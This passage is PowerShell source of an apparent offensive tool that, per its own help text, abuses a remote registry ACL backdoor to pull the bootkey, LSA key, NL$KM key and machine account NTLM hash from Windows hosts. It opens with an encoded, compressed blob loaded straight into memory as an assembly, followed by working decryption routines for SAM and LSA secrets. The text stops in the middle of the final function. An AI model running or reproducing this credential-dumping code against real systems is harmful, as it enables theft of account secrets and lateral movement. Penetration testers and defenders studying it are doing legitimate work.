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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](3584)
$DeflatedStream.Read($UncompressedFileBytes, 0, 3584) | Out-Null
$Null = [Reflection.Assembly]::Load($UncompressedFileBytes)


function Decrypt-Hash {
<#
.SYNOPSIS

Helper that to decryptes an LM/NT user hash using the HBootKey.

Adapted from https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1

Credit to Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K) !
#>
    [CmdletBinding()]
    Param(
        $RID,

        [Byte[]]
        $HBootKey,

        [Byte[]]
        $EncHash,

        [ValidateSet('NT', 'LM')]
        [String]
        $HashType = 'NT'
    )

    $EmptyLMHash = [Byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
    $EmptyNTHash = [Byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0)

    function DESDecrypt {
        Param(
            [Byte[]]
            $Data,

            [Byte[]]
            $Key
        )

        $DES = New-Object Security.Cryptography.DESCryptoServiceProvider
        $DES.Mode = [Security.Cryptography.CipherMode]::ECB
        $DES.Padding = [Security.Cryptography.PaddingMode]::None
        $DES.Key = $Key
        $DES.IV = $Key
        $DES.CreateDecryptor().TransformFinalBlock($Data, 0, $Data.Length)
    }

    function ConvertRID-ToKey ($RID) {

        $s1 = @()
        $s1 += [Char]($RID -band 0xFF)
        $s1 += [Char]([Shift]::Right($RID, 8) -band 0xFF)
        $s1 += [Char]([Shift]::Right($RID, 16) -band 0xFF)
        $s1 += [Char]([Shift]::Right($RID, 24) -band 0xFF)
        $s1 += $s1[0]
        $s1 += $s1[1]
        $s1 += $s1[2]
        $s2 = @()
        $s2 += $s1[3]
        $s2 += $s1[0]
        $s2 += $s1[1]
        $s2 += $s1[2]
        $s2 += $s2[0]
        $s2 += $s2[1]
        $s2 += $s2[2]
        
        ,((ConvertSTR-ToKey $s1), (ConvertSTR-ToKey $s2))
    }

    function ConvertSTR-ToKey ($S) {
        $OddParity = @(
            1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
            16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
            32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
            49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
            64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
            81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
            97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
            112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
            128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
            145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
            161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
            176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
            193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
            208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
            224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
            241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
        )

        # convert des 56 to 64
        $Key = @()
        $Key += [Shift]::Right([Int]($S[0]), 1 )
        $Key += [Shift]::Left( $([Int]($S[0]) -band 0x01), 6) -bor [Shift]::Right([Int]($S[1]), 2)
        $Key += [Shift]::Left( $([Int]($S[1]) -band 0x03), 5) -bor [Shift]::Right([Int]($S[2]), 3)
        $Key += [Shift]::Left( $([Int]($S[2]) -band 0x07), 4) -bor [Shift]::Right([Int]($S[3]), 4)
        $Key += [Shift]::Left( $([Int]($S[3]) -band 0x0F), 3) -bor [Shift]::Right([Int]($S[4]), 5)
        $Key += [Shift]::Left( $([Int]($S[4]) -band 0x1F), 2) -bor [Shift]::Right([Int]($S[5]), 6)
        $Key += [Shift]::Left( $([Int]($S[5]) -band 0x3F), 1) -bor [Shift]::Right([Int]($S[6]), 7)
        $Key += $([Int]($S[6]) -band 0x7F)

        0..7 | % {
            $Key[$_] = [Shift]::Left($Key[$_], 1);
            $Key[$_] = $OddParity[$Key[$_]];
        }

        $Key
    }

    if ($EncHash) {
        # basically a PowerShell implementation of SystemFunction005
        $DESKeys = ConvertRID-ToKey -RID $RID
        $MD5 = [Security.Cryptography.MD5]::Create()

        if ($HashType -eq 'NT') {
            $RC4Key = $MD5.ComputeHash($hBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0"))
        }
        else {
            $RC4Key = $MD5.ComputeHash($hBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0"))
        }

        $OBFKey = ConvertTo-Rc4ByteStream -InputObject $EncHash -Key $RC4key

        (DESDecrypt $OBFKey[0..7] $DESKeys[0]) + (DESDecrypt $OBFKey[8..$($OBFKey.Length - 1)] $DESKeys[1])
    }
    elseif ($HashType -eq 'NT') {
        $EmptyNTHash
    }
    else {
        $EmptyLMHash
    }
}


function Decrypt-Bytes {
<#
.SYNOPSIS

Helper that to decrypt an AES blob.

Used to decrypt LSA secret with temp key.
#>
    [CmdletBinding()]
    Param(
        [Parameter()]
        [Byte[]]
        $Key,

        [Parameter()]
        [Byte[]]
        $CipherText,

        [Parameter()]
        [Byte[]]
        $IV = @(0) * 16
    )

    $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $AES.Mode = "CBC"
    $AES.Key = $Key
    $AES.IV = $IV
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    ($AES.CreateDecryptor()).TransformFinalBlock($CipherText, 0, $CipherText.Length)
}


function Decrypt-AES {
<#
.SYNOPSIS

Helper that to decrypt an AES blob.

Used to decrypt LSA secret with temp key.
#>
    [CmdletBinding()]
    Param(
        [Parameter()]
        [Byte[]]
        $Key,

        [Parameter()]
        [Byte[]]
        $CipherText,

        [Parameter()]
        [Byte[]]
        $IV = @(0) * 16,

        [Parameter()]
        [String]
        $PaddingMode = "Zeros"
    )

    $AES = New-Object System.Security.Cryptography.RijndaelManaged
    $AES.Key = $Key 
    $AES.IV = $IV
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::$PaddingMode
    $AES.BlockSize = 128
    $Transform = $AES.CreateDecryptor()
    $Chunks = [Math]::Ceiling($CipherText.Length / 16)

    $Plaintext = @()

    try {
        for($i=0; $i -lt $Chunks; $i++) {
            $Offset = $i*16;
            $Chunk = $CipherText[$Offset..($Offset+15)]
            try {
                $Plaintext += $Transform.TransformFinalBlock($Chunk, 0, $Chunk.Count)
            }
            catch {
                Write-Warning "Error transforming block: $_"
            }
        }
        $Plaintext
    }
    catch {
        $_
    }

    try {
        $Transform.Dispose()
        $AES.Dispose()
    }
    catch {}
}


function Get-LsaSha256Hash {
<#
.SYNOPSIS

Helper that calculates the proper SHA256 hash of an LSA key.
#>
    [CmdletBinding()]
    Param(
        [Parameter()]
        [Byte[]]
        $Key,

        [Parameter()]
        [Byte[]]
        $Data
    )

    $Sha256 = New-Object System.Security.Cryptography.SHA256Managed
    $Sha256.ComputeHash($Key + ($Data * 1000))
    try {
        $Sha256.Dispose()
    }
    catch {}
}


function ConvertTo-Rc4ByteStream {
<#
.SYNOPSIS

Converts an input byte array to a RC4 cipher stream using the specified key.

Author: @harmj0y
License: BSD 3-Clause
Required Dependencies: None

.PARAMETER InputObject

The input byte array to encrypt with the RC4 cipher.

.PARAMETER Key

The byte array of the RC4 key to use.

.EXAMPLE

$Enc = [System.Text.Encoding]::ASCII
$Data = $Enc.GetBytes('This is a test! This is only a test.')
$Key = $Enc.GetBytes('SECRET')
($Data | ConvertTo-Rc4ByteStream -Key $Key | ForEach-Object { "{0:X2}" -f $_ }) -join ' '

.LINK

https://en.wikipedia.org/wiki/RC4
http://www.remkoweijnen.nl/blog/2013/04/05/rc4-encryption-in-powershell/
#>
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $InputObject,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Key
    )

    begin {
        # key-scheduling algorithm
        [Byte[]] $S = 0..255
        $J = 0
        0..255 | ForEach-Object {
            $J = ($J + $S[$_] + $Key[$_ % $Key.Length]) % 256
            $S[$_], $S[$J] = $S[$J], $S[$_]
        }
        $I = $J = 0
    }

    process {
        # pseudo-random generation algorithm (PRGA) combined with XOR logic
        ForEach($Byte in $InputObject) {
            $I = ($I + 1) % 256
            $J = ($J + $S[$I]) % 256
            $S[$I], $S[$J] = $S[$J], $S[$I]
            $Byte -bxor $S[($S[$I] + $S[$J]) % 256]
        }
    }
}


function Get-RemoteBootKey {
<#
.SYNOPSIS

Helper that retrieves the bootkey/syskey from a remote registry instance.

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
License: BSD 3-Clause  
Required Dependencies: PSReflect

.DESCRIPTION

Takes a remote registry handle and uses the RegOpenKeyEx/RegQueryInfoKey API calls
to query the appropriate class info from the HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\JD,
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Skew1, HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\GBG,
and HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Data keys, and uses these values to calculate
the SysKey/bootkey.

.PARAMETER hKey

Specifies the handle to the remote registry instance to retrieve the bootkey from.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $hKey
    )

    # get the 'JD' class
    $Result = $Advapi32::RegOpenKeyEx($nKey, "SYSTEM\CurrentControlSet\Control\Lsa\JD", 0, 0x19, [ref]$hKey)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error opening the SYSTEM\CurrentControlSet\Control\Lsa\JD key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    $ClassVal = New-Object Text.Stringbuilder 1024
    [Int]$len = 1024
    $Result = $Advapi32::RegQueryInfoKey($hKey,$ClassVal,[ref]$len,0,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[System.IntPtr]::Zero)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error enumerating the SYSTEM\CurrentControlSet\Control\Lsa\JD key: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
    $JDCLass = $ClassVal.ToString()

    # get the 'Skew1' class
    $Result = $Advapi32::RegOpenKeyEx($nKey,"SYSTEM\CurrentControlSet\Control\Lsa\Skew1",0,0x19,[ref]$hKey)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error opening the SYSTEM\CurrentControlSet\Control\Lsa\Skew1 key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    $ClassVal = New-Object Text.Stringbuilder 1024
    [Int]$len = 1024
    $Result = $Advapi32::RegQueryInfoKey($hKey,$ClassVal,[ref]$len,0,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[System.IntPtr]::Zero)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error enumerating the SYSTEM\CurrentControlSet\Control\Lsa\Skew1 key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }
    $Skew1CLass = $ClassVal.ToString()

    # get the 'GBG' class
    $Result = $Advapi32::RegOpenKeyEx($nKey,"SYSTEM\CurrentControlSet\Control\Lsa\GBG",0,0x19,[ref]$hKey)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error opening the SYSTEM\CurrentControlSet\Control\Lsa\GBG key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    $ClassVal = New-Object Text.Stringbuilder 1024
    [Int]$len = 1024
    $Result = $Advapi32::RegQueryInfoKey($hKey,$ClassVal,[ref]$len,0,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[System.IntPtr]::Zero)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error enumerating the SYSTEM\CurrentControlSet\Control\Lsa\GBG key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }
    $GBGCLass = $ClassVal.ToString()

    # get the 'Data' class
    $Result = $Advapi32::RegOpenKeyEx($nKey,"SYSTEM\CurrentControlSet\Control\Lsa\Data",0,0x19,[ref]$hKey)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error opening the SYSTEM\CurrentControlSet\Control\Lsa\Data key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    $ClassVal = New-Object Text.Stringbuilder 1024
    [Int]$len = 1024
    $Result = $Advapi32::RegQueryInfoKey($hKey,$ClassVal,[ref]$len,0,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[ref][System.IntPtr]::Zero,[System.IntPtr]::Zero)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error enumerating the SYSTEM\CurrentControlSet\Control\Lsa\Data key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }
    $DataCLass = $ClassVal.ToString()

    # use the combined class data to calculate the boot key
    $Combined = $JDClass + $Skew1CLass + $GBGCLass + $DataCLass

    # pulled from https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1
    #   credit to Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)
    $B = New-Object Byte[] $($Combined.Length/2);
    0..$($B.Length-1) | %{$B[$_] = [Convert]::ToByte($Combined.Substring($($_*2),2),16)}
    $Bootkey = New-Object Byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$Bootkey[$i]=$B[$_];$i++}

    $Bootkey
}


function Get-RemoteLSAKey {
<#
.SYNOPSIS

Helper that retrieves the LSA key from a remote registry instance.

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
License: BSD 3-Clause  
Required Dependencies: PSReflect

.DESCRIPTION

Takes a remote registry handle and uses the RegOpenKeyEx/RegQueryValueEx API calls
to extract the encrypted LSA bytes from the HKLM:\SECURITY\Policy\PolEKList key,
calculates the appropriate SHA256 hash using the bootkey, and then decrypts the
LSA key using the combined value. 

.PARAMETER hKey

Specifies the handle to the remote registry instance to retrieve the LSA key from.

.PARAMETER BootKey

A byte array containing the decrypted bootkey/syskey.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $hKey,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $BootKey
    )

    [IntPtr]$pKey = [System.IntPtr]::Zero
    $Result = $Advapi32::RegOpenKeyEx($nKey,"SECURITY\Policy\PolEKList",0,0x19,[ref]$pKey)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error opening the SECURITY\Policy\PolEKList key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    [Int]$Size = 0
    $Result = $Advapi32::RegQueryValueEx($pKey,$Null,0,[ref]0,$Null,[ref]$Size)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error enumerating the SECURITY\Policy\PolEKList key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    $LSAKeyEncryptedStruct = New-Object Byte[] $Size
    $Result = $Advapi32::RegQueryValueEx($pKey,$Null,0,[ref]0,$LSAKeyEncryptedStruct,[ref]$Size)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error enumerating the SECURITY\Policy\PolEKList key, part 2: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    # calculate the temp key by using the boot key to calculate the Sha256 hash on the first 32 bytes
    # of the LSA key data
    $LSAEncryptedData = $LSAKeyEncryptedStruct[28..($LSAKeyEncryptedStruct.Count)]
    $TmpKey = Get-LsaSha256Hash -Key $BootKey -Data $LSAEncryptedData[0..31]

    # use the temp key to decrypt the rest of the LSA struct
    $LSAKeyStructCipherText = $LSAEncryptedData[32..($LSAEncryptedData.Count)]
    $LSAKeyStructPlaintext = Decrypt-AES -Key $TmpKey -CipherText $LSAKeyStructCipherText
    $LSAKey = $LSAKeyStructPlaintext[68..99]

    $LSAKey
}


function Get-RemoteNLKMKey {
<#
.SYNOPSIS

Helper that retrieves the NL$KM key from a remote registry instance. This key us used to
encrypt cached credentials.

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
License: BSD 3-Clause  
Required Dependencies: PSReflect

.DESCRIPTION

Takes a remote registry handle and uses the RegOpenKeyEx/RegQueryValueEx API calls
to extract the encrypted LSA bytes from the SECURITY\Policy\Secrets\NL$KM\CurrVal
key and decrypts this key using the passed LSA key.

.PARAMETER hKey

Specifies the handle to the remote registry instance to retrieve the NL$KM key from.

.PARAMETER LSAKey

A byte array containing the decrypted LSA Key.
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $hKey,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $LSAKey
    )

    [IntPtr]$sKey = [System.IntPtr]::Zero
    $Result = $Advapi32::RegOpenKeyEx($nKey,'SECURITY\Policy\Secrets\NL$KM\CurrVal',0,0x19,[ref]$sKey)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error opening the SECURITY\Policy\Secrets\NL`$KM\CurrVal key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    [Int]$Size = 0
    $Result = $Advapi32::RegQueryValueEx($sKey, $Null, 0, [ref]0, $Null, [ref]$Size)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error querying the SECURITY\Policy\Secrets\NL`$KM\CurrVal key: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    $CurrVal = New-Object Byte[] $Size
    $Result = $Advapi32::RegQueryValueEx($sKey, $Null, 0, [ref]0, $CurrVal, [ref]$Size)
    if($Result -ne 0) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "[$Computer] Error querying the SECURITY\Policy\Secrets\NL`$KM\CurrVal key, part 2: $(([ComponentModel.Win32Exception] $Result).Message)"
        return
    }

    # calculate the temp key by using the LSA key to calculate the Sha256 hash on the first 32 bytes
    # of the extracted NL$KM encrypted data
    $EncryptedData = $CurrVal[28..($CurrVal.Count)]
    $TempKey = Get-LsaSha256Hash -Key $LSAKey -Data $EncryptedData[0..31]

    # decrypt the NL$KM key cipher text using the composite temp key
    $HashStructCipherText = $EncryptedData[32..($EncryptedData.Count)]
    $HashStructPlaintext = Decrypt-AES -Key $TempKey -CipherText $HashStructCipherText
    $HashBytes = $HashStructPlaintext[16..79]
    $HashBytes
}


function Get-RemoteMachineAccountHash {
<#
.SYNOPSIS

Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve
the local machine account hash for the specified machine.

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-RemoteBootKey, Get-LsaSha256Hash, Decrypt-AES, MD4 assembly

.DESCRIPTION

Opens up the remote registry instance specified by -ComputerName, retrieves the
SysKey/bootkey with Get-RemoteBootKey, uses the BootKey to decrypt the LSA key,
and finally uses the LSA key to decrypt the MachineAccount hash of the remote system.

.PARAMETER ComputerName

Specifies the hostname to retrieve the local machine account hash for.
Defaults to localhost.

.EXAMPLE

Get-RemoteMachineAccountHash -Computername client.external.local -Verbose

VERBOSE: Bootkey/SysKey : 0AF496ADE2F34BB46BF052392F97F310
VERBOSE: LSA Key        : 0C6EA4CAAC7B8165C0E5890F0C2D7254E044A93C361588CDB4B6C2874ABF0D67

ComputerName                            MachineAccountHash
------------                            ------------------
client.external.local                   66A94EF4523795A785531A5AD4213165

.LINK

http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html
https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1
https://www.win.tue.nl/~aeb/linux/hh/Hackers_Hut_Windows_passwords.pdf
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    # good reference on this process: http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html
    ForEach($Computer in $ComputerName) {
        # connect to the registry on the remote system
        [IntPtr]$nKey = [System.IntPtr]::Zero
        # 0x80000002 == HKEY_LOCAL_MACHINE
        $Result = $Advapi32::RegConnectRegistry("\\$($Computer)", 0x80000002, [ref]$nKey)
        if($Result -ne 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "[$Computer] Error connecting to remote registry: $(([ComponentModel.Win32Exception] $Result).Message)"
            return
        }

        # extract the bootkey from the remote registry
        $BootKey = Get-RemoteBootKey -hKey $nKey

        # extract the LSA key from the remote registry using the bootkey
        $LSAKey = Get-RemoteLSAKey -hKey $nKey -BootKey $BootKey

        Write-Verbose ("Bootkey/SysKey : " + ([System.BitConverter]::ToString($BootKey) -replace '-',''))
        Write-Verbose ("LSA Key        : " + ([System.BitConverter]::ToString($LSAKey) -replace '-',''))

        # extract out the encrypted machine account data
        [IntPtr]$sKey = [System.IntPtr]::Zero
        $Result = $Advapi32::RegOpenKeyEx($nKey,'SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal',0,0x19,[ref]$sKey)
        if($Result -ne 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "[$Computer] Error opening the SECURITY\Policy\Secrets\`$MACHINE.ACC\CurrVal key: $(([ComponentModel.Win32Exception] $Result).Message)"
            return
        }

        [Int]$Size = 0
        $Result = $Advapi32::RegQueryValueEx($sKey, $Null, 0, [ref]0, $Null, [ref]$Size)
        if($Result -ne 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "[$Computer] Error querying the SECURITY\Policy\Secrets\`$MACHINE.ACC\CurrVal key: $(([ComponentModel.Win32Exception] $Result).Message)"
            return
        }

        $CurrVal = New-Object Byte[] $Size
        $Result = $Advapi32::RegQueryValueEx($sKey, $Null, 0, [ref]0, $CurrVal, [ref]$Size)
        if($Result -ne 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "[$Computer] Error querying the SECURITY\Policy\Secrets\`$MACHINE.ACC\CurrVal key, part 2: $(([ComponentModel.Win32Exception] $Result).Message)"
            return
        }

        # calculate the temp key by using the LSA key to calculate the Sha256 hash on the first 32 bytes
        # of the extracted machine account data
        $EncryptedData = $CurrVal[28..($CurrVal.Count)]
        $TempKey = Get-LsaSha256Hash -Key $LSAKey -Data $EncryptedData[0..31]

        # decrypt the machine account key cipher text using the composite temp key
        $MachineHashStructCipherText = $EncryptedData[32..($EncryptedData.Count)]
        $MachineHashStructPlaintext = Decrypt-AES -Key $TempKey -CipherText $MachineHashStructCipherText
        $MachineHashBytes = $MachineHashStructPlaintext[16..255]

        # MD4 hash the resulting machine account hash bytes to create the resulting
        # machine account NTLM hash
        $MD4 = [JetBlack.Authorisation.Utils._MD4]::Create()
        $Out = $MD4.ComputeHash($MachineHashBytes)    
